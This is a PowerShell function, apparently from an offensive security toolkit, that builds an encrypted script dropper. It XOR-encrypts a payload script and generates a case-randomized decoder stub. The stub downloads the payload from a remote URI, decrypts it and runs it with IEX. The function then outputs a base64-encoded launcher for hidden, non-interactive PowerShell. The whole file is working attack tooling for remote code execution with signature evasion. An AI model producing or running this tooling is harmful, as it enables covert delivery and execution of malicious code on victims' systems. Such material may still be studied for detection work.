function Out-EncryptedScriptDropper {
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptPath,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $DownloadURI,

        [Parameter(Position = 2)]
        [String]
        $OutFile = '.\out'
    )

    function Invoke-RandomizeCase {
        param($s)
        ($s.ToCharArray() | %{
            if(Get-Random $true,$false){
                $_.ToString().ToUpper()
            }
            else{
                $_.ToString().ToLower()
            }
        }) -join ""
    }

    # generate a random key to XOR the script
    $r=1..16|ForEach-Object{Get-Random -max 61};
    $XORKey=('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789'[$r] -join '');

    $code = (Get-Content -Encoding Ascii -Path $ScriptPath)
    $code = $code.trim()

    # XOR the code with the specified $XORKey
    $i=0;
    $a=([byte[]]([char[]]($code)|%{$_-bXor$XORKey[$i++%$XORKey.Length]}));

    # write the binary "encrypted" script out to the specified location
    Set-content $OutFile $a -encoding byte

    # build the decoder stub with randomized casing where possible
    $decoder = Invoke-RandomizeCase '$WC=NEw-ObjECt SYStEm.Net.WEbCLIEnt;$k="'
    $decoder += $XORKey
    $decoder += Invoke-RandomizeCase '";$i=0;[char[]]$b=([char[]]($wC.DOwNLoadSTRING("'
    $decoder += $DownloadURI
    $decoder += Invoke-RandomizeCase '")))|%{$_-bXor$k[$i++%$k.Length]};IEX ($b-join"")'
    $decoder
    # base64 encode the stub and output the launcher
    $enc = (iex "cmd /c echo {$decoder}").split(" ")[1]

    "`nlaunching command: `n"
    "powershell -w hidden -nop -noni -enc $enc"
    "`nencrypted script to host at $DownloadURI : $OutFile`n"
}

# EX- Out-EncryptedScriptDropper -ScriptPath .\test.ps1 -DownloadURI "http://192.168.52.146/out"
